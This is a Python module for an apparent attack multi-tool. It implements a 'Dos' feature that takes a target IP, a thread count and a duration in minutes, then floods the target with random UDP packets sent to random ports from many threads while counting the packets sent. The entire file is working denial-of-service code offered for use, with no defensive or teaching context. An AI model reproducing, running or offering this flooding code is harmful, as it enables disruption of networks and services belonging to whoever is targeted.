from Features.base import FeatureBase
import threading
import random
import socket
import time

packets = 1
attack_duration = 0

#Functions
def dos_thread(target):
    try:
        global packets
        global attack_duration
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < attack_duration:
            dport = random.randint(20, 55500)
            sock.sendto(bytes*random.randint(5,15), (target, dport))
            packets=packets+1
        return True
    except:
        print("Thread Failed!")

class Feature(FeatureBase):
    def __init__(self):
        super().__init__(
            name="Dos",
            description="This is a Dos not DDos",
            options=[
                {
                    "message": "Target IP: ",
                    "type": "input",
                    "name": 'target'
                },
                {
                    "message": "Threads(Don't go over 200): ",
                    "type": "input",
                    "name": "threads"
                },
                {
                    "message": "Attack Duration(In minutes): ",
                    "type": 'input',
                    "name": "duration"
                }
            ]
        )

    def function(self, options):
        global attack_duration
        global packets
        attack_duration = time.time()+int(options['duration']) * 60
        print("Starting Attack...")
        for i in range(int(options['threads'])):
            threading.Thread(target=dos_thread, args=(options['target'],)).start()
        while time.time() < attack_duration:
            print("\rPackets Sent: "+str(packets), end='', flush=True)
        print('\nFinished Attack')
        input('Press any key to return to main screen.')